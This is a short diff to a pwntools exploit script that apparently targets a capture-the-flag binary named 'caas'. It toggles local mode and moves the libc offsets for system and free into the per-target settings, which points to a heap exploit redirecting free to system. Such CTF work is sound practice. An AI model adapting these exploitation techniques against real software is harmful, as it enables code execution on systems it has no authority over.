@@ -1,6 +1,6 @@
 from pwn import *
 
-g_local = False
+g_local = True
 if g_local:
 	sh=process("./caas")
 	WORKER1_ADDR = 0x1170#0x570
@@ -8,6 +8,8 @@ if g_local:
 	WORKER1_SIGN = 0x170#0x570
 	JOB1_CONTENT_ADDR = 0x11440#0x10840
 	JOB2_CONTENT_ADDR = 0x11500#0x10900
+	SYSTEM_ADDR = 0x0003ada0#0x3ada0
+	FREE_ADDR = 0x71470#0x71470
 else:
 	sh=process("/problems/4e35adf4276b6c2f727f265de95d588b/caas")
 	WORKER1_ADDR = 0x168
@@ -15,6 +17,8 @@ else:
 	WORKER1_SIGN = WORKER1_ADDR
 	JOB1_CONTENT_ADDR = 0x10438
 	JOB2_CONTENT_ADDR = 0x104f8
+	SYSTEM_ADDR = 0x041490
+	FREE_ADDR = 0x7c600
 
 heap_base_addr = None
 
@@ -177,8 +181,7 @@ yield_worker()
 
 sh.send("3\n")
 
-SYSTEM_ADDR = 0x0003ada0#0x3ada0
-FREE_ADDR = 0x71470#0x71470
+
 
 sh.recvuntil("Getting Job\n")
 got_info = sh.recv()
